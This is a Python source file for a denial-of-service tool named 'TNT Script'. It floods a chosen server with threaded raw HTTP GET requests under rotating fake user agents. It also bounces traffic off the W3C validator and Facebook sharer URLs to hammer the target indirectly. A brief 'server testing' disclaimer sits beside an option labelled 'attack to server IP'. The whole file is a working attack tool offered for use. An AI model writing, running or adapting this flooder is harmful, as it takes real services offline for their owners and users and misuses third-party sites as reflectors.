from queue import Queue
from optparse import OptionParser
import time
import sys
import socket
import threading
import logging
import urllib.request
import random

class TNT:
    def __init__(self):
        self.uagent = self.user_agent()
        self.bots = self.my_bots()
        self.data = self.read_headers()
        self.q = Queue()
        self.w = Queue()
        self.host = None
        self.port = 80
        self.thr = 135

    def user_agent(self):
        return [
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        ]

    def my_bots(self):
        return [
            "http://validator.w3.org/check?uri=",
            "http://www.facebook.com/sharer/sharer.php?u="
        ]

    def bot_hammering(self, url):
        while True:
            try:
                req = urllib.request.urlopen(urllib.request.Request(url, headers={'User -Agent': random.choice(self.uagent)}))
                print("\033[94mProcessing...\033[0m")
                time.sleep(0.1)
            except Exception as e:
                print(f"\033[91mError in bot_hammering: {e}\033[0m")
                time.sleep(0.1)

    def down_it(self, item):
        while True:
            try:
                packet = f"GET / HTTP/1.1\nHost: {self.host}\nUser -Agent: {random.choice(self.uagent)}\n\n".encode('utf-8')
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((self.host, self.port))
                    s.sendall(packet)
                    print(f"\033[92m{time.ctime(time.time())}\033[0m \033[94m <--packet sent! --> \033[0m")
                time.sleep(0.1)
            except socket.error as e:
                print(f"\033[91mNo connection! Server may be down: {e}\033[0m")
                time.sleep(0.1)

    def dos(self):
        while True:
            item = self.q.get()
            self.down_it(item)
            self.q.task_done()

    def dos2(self):
        while True:
            item = self.w.get()
            self.bot_hammering(random.choice(self.bots) + "http://" + self.host)
            self.w.task_done()

    def usage(self):
        print(''' \033[92m TNT Script v.1
        It is the end user's responsibility to obey all applicable laws.
        It is just for server testing script. Your IP is visible. \n
        usage : python3 tnt.py [-s] [-p] [-t]
        -h : help
        -s : server IP
        -p : port default 80
        -t : turbo default 135 \033[0m''')
        sys.exit()

    def get_parameters(self):
        optp = OptionParser(add_help_option=False, epilog="TNT")
        optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
        optp.add_option("-s", "--server", dest="host", help="attack to server IP -s ip")
        optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
        optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 135 -t 135")
        optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
        opts, args = optp.parse_args()
        logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
        if opts.help:
            self.usage()
        if opts.host is not None:
            self.host = opts.host
        else:
            self.usage()
        self.port = opts.port if opts.port is not None else 80
        self.thr = opts.turbo if opts.turbo is not None else 135

    def read_headers(self):
        try:
            with open("headers.txt", "r") as headers:
                return headers.read()
        except FileNotFoundError:
            print("\033[91mHeader file not found!\033[0m")
            sys.exit()

    def start(self):
        print(f"\033[92m{self.host} port: {self.port} turbo: {self.thr}\033[0m")
        print("\033[94mPlease wait...\033[0m")
        time.sleep(5)
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.host, self.port))
                s.settimeout(1)
        except socket.error as e:
            print(f"\033[91mCheck server IP and port: {e}\033[0m")
            self.usage()

        for _ in range(self.thr):
            threading.Thread(target=self.dos, daemon=True).start()
            threading.Thread(target=self.dos2, daemon=True).start()

        item = 0
        while True:
            if item > 1800:  # Prevent memory crash
                item = 0
                time.sleep(0.1)
            item += 1
            self.q.put(item)
            self.w.put(item)

if __name__ == '__main__':
    tnt = TNT()
    tnt.get_parameters()
    tnt.start()
